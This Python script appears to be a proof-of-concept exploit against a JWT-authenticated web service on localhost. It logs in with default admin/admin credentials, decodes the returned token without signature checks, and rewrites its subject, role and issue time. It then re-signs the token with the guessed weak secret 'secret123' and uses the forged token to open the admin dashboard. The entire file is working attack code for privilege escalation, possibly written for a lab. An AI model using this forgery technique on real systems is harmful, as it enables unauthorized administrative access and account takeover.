import jwt
import subprocess
import json
import time
curl_command = [
    'curl', 
    '-X', 'POST', 
    'http://localhost:8000/auth/login',
    '-H', 'Content-Type: application/json',
    '-d', '{"username": "admin", "password": "admin"}'
]
result = subprocess.run(curl_command, capture_output=True, text=True)

try:
    login_data = json.loads(result.stdout)
    token = login_data.get("access_token") 
    print(f"Captured Token: {token[:20]}...") 
except Exception as e:
    print(f"Failed to parse curl output: {e}")
    exit()

decoded_data = jwt.decode(token, options={"verify_signature": False})

print(decoded_data)

decoded_data['sub'] = 'aaaaa'
decoded_data['role'] = 'admin'
decoded_data['iat'] = int(time.time()) - (365 * 24 * 60 * 60)

SECRET_KEY = "secret123" 
forged_token = jwt.encode(decoded_data, SECRET_KEY, algorithm="HS256")

print(decoded_data)
print(forged_token)

curl_dashboard = [
    'curl', '-s',
    '-H', f'Authorization: Bearer {forged_token}', 
    'http://localhost:8000/admin/dashboard'
]

final_result = subprocess.run(curl_dashboard, capture_output=True, text=True)
print(final_result.stdout)